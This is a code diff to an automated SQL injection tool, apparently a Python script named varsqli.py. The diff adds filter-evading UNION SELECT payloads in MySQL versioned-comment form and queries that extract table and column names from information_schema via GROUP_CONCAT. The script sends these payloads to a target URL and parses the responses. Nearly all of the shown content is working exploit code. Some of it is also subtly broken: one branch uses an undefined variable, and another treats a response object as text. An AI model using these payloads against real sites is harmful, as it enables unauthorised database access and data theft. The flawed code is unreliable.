@@ -37,25 +37,25 @@ check_vuln = [
     '**%27',
 ]
 payloads = [
-    '/**8**/UNION/**8**/SELECT/**8**/1,2--+-',
-    '/**8**/UNION/**8**/SELECT/**8**/1,2,3--+-',
-    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4--+-',
-    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5--+-',
-    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6--+-',
-    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7--+-',
-    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8--+-',
-    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9--+-',
-    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10--+-',
-    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11--+-',
-    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12--+-',
-    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13--+-',
-    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14--+-',
-    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+-',
-    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--+-',
-    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+-',
-    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-',
-    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-',
-    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-',
+    '/*!50000UNION*//*!50000SELECT*/1,2--+-',
+    '/*!50000UNION*//*!50000SELECT*/1,2,3--+-',
+    '/*!50000UNION*//*!50000SELECT*/1,2,3,4--+-',
+    '/*!50000UNION*//*!50000SELECT*/1,2,3,4,5--+-',
+    '/*!50000UNION*//*!50000SELECT*/1,2,3,4,5,6--+-',
+    '/*!50000UNION*//*!50000SELECT*/1,2,3,4,5,6,7--+-',
+    '/*!50000UNION*//*!50000SELECT*/1,2,3,4,5,6,7,8--+-',
+    '/*!50000UNION*//*!50000SELECT*/1,2,3,4,5,6,7,8,9--+-',
+    '/*!50000UNION*//*!50000SELECT*/1,2,3,4,5,6,7,8,9,10--+-',
+    '/*!50000UNION*//*!50000SELECT*/1,2,3,4,5,6,7,8,9,10,11--+-',
+    '/*!50000UNION*//*!50000SELECT*/1,2,3,4,5,6,7,8,9,10,11,12--+-',
+    '/*!50000UNION*//*!50000SELECT*/1,2,3,4,5,6,7,8,9,10,11,12,13--+-',
+    '/*!50000UNION*//*!50000SELECT*/1,2,3,4,5,6,7,8,9,10,11,12,13,14--+-',
+    '/*!50000UNION*//*!50000SELECT*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+-',
+    '/*!50000UNION*//*!50000SELECT*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--+-',
+    '/*!50000UNION*//*!50000SELECT*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+-',
+    '/*!50000UNION*//*!50000SELECT*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-',
+    '/*!50000UNION*//*!50000SELECT*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-',
+    '/*!50000UNION*//*!50000SELECT*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-',
     '/**8**/UNION SELECT ALL 1,2',
     '/**8**/UNION SELECT ALL 1,2,3',
     '/**8**/UNION SELECT ALL 1,2,3,4',
@@ -75,6 +75,25 @@ payloads = [
     '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18',
     '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19',
     '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-',
+    '/**8**/UNION/**8**/SELECT/**8**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-',
     '/**8**/UNION SELECT ALL NULL,NULL',
     '/**8**/UNION SELECT ALL NULL,NULL,NULL',
     '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL',
@@ -150,11 +169,13 @@ if URL_TARGET:
                         print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Checking Completed")
                         time.sleep(0.20)
                         print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Target May Be Vulnerable")
-                        if str(num_columns) in result_2.text:
+                        resultss = requests.get(URL_TARGET + payload_2)
+                        if str(num_columns) in resultss.text:
                             print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "numeric columns detected...")
                             time.sleep(0.20)
                             print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "TESTING UNION SELECT ALL (MYSQL COMMAND)...")
                             time.sleep(0.30)
+
                             if "The used SELECT" in result_2.text:
                                 print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Testing Payload {}".format(payload_2))
                                 time.sleep(0.30)
@@ -237,8 +258,8 @@ if URL_TARGET:
                                     print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns --dump-dbs")
 
                                 if args.tab:
-                                    query = payload_2.replace("2", "table_name")
-                                    payload_6 = f"{query} From information_schema.tables"
+                                    query = re.sub(r"\b2\b", "(SELECT GROUP_CONCAT(table_name+SEPARATOR+'<h2>')+FROM+information_schema.tables+WHERE+table_schema=database())", payload_2)
+                                    payload_6 = f"{query}"
                                     print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_6))
                                     result_6 = requests.get(URL_TARGET, payload_6)
                                     if "The used SELECT" in result_6:
@@ -257,8 +278,8 @@ if URL_TARGET:
                                         print("")
 
                                 if args.col:
-                                    query = payload_2.replace("2", "column_name")
-                                    payload_6 = f"{query} From information_schema.tables"
+                                    query = re.sub(r"\b2\b", "(SELECT GROUP_CONCAT(column_name+SEPARATOR+'<h2>')+FROM+information_schema.columns+WHERE+table_schema=database())", payload_2)
+                                    payload_6 = f"{query}"
                                     print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_6))
                                     result_6 = requests.get(URL_TARGET, payload_6)
                                     if "The used SELECT" in result_6:
@@ -279,7 +300,7 @@ if URL_TARGET:
                                 
                                 if args.tables:
                                     if args.name_db:
-                                        query = payload_2.replace("2", "table_name")
+                                        query = re.sub(r"\b2\b", "table_name", payload_2)
                                         payload_6 = f"{query} From information_schema.tables where table_schema = '{args.name_db}'"
                                         print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_6))
                                         result_6 = requests.get(URL_TARGET, payload_6)
@@ -303,7 +324,7 @@ if URL_TARGET:
 
                                 if args.column:
                                     if args.name_column:
-                                        query_1 = payload_2.replace("2", "column_name")
+                                        query = re.sub(r"\b2\b", "column_name", payload_2)
                                         payload_7 = f"{query_1} From information_schema.columns where table_schema = '{args.name_column}'"
                                         print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_7))
                                         result_6 = requests.get(URL_TARGET, payload_7)
